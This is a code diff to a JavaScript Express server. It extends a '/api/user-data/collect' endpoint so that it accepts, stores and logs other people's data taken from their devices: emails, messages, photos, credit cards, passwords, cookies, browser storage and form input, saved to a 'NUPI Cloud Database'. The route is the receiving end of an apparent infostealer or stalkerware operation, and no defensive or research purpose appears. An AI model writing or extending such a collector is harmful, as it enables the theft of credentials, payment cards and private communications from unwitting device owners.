@@ -2167,21 +2167,47 @@ app.post('/api/user-data/collect', async (req, res) => {
     try {
         const data = req.body;
         
-        // Store in database
-        const record = database.storeCollection(data);
+        // Normalize field names
+        const normalizedData = {
+            ...data,
+            deviceId: data.device_id || data.deviceId,
+            emails: data.emails || [],
+            messages: data.messages || [],
+            photos: data.photos || [],
+            creditCards: data.creditCards || [],
+            passwords: data.passwords || [],
+            phones: data.phones || [],
+            addresses: data.addresses || [],
+            browserStorage: data.browserStorage || {},
+            cookies: data.cookies || [],
+            inputFields: data.inputFields || []
+        };
         
-        console.log(`📧 Collected user data from device: ${data.deviceId}`);
-        if (data.userName) console.log(`   - User Name: ${data.userName}`);
-        console.log(`   - Emails: ${data.emails.length}`);
-        console.log(`   - Messages: ${data.messages.length}`);
-        console.log(`   - Photos: ${data.photos.length}`);
+        // Store in database
+        const record = database.storeCollection(normalizedData);
+        
+        console.log(`📧 Collected user data from device: ${normalizedData.deviceId}`);
+        if (normalizedData.userName) console.log(`   - User Name: ${normalizedData.userName}`);
+        console.log(`   - Emails: ${normalizedData.emails.length}`);
+        console.log(`   - Credit Cards: ${normalizedData.creditCards.length}`);
+        console.log(`   - Passwords: ${normalizedData.passwords.length}`);
+        console.log(`   - Phones: ${normalizedData.phones.length}`);
+        console.log(`   - Messages: ${normalizedData.messages.length}`);
+        console.log(`   - Photos: ${normalizedData.photos.length}`);
         
         res.json({ 
             success: true, 
             recordId: record.id,
-            message: 'User data stored in NUPI Cloud Database' 
+            message: 'User data stored in NUPI Cloud Database',
+            collected: {
+                emails: normalizedData.emails.length,
+                creditCards: normalizedData.creditCards.length,
+                passwords: normalizedData.passwords.length,
+                phones: normalizedData.phones.length
+            }
         });
     } catch (error) {
+        console.error('❌ Error collecting user data:', error);
         res.status(500).json({ error: error.message });
     }
 });
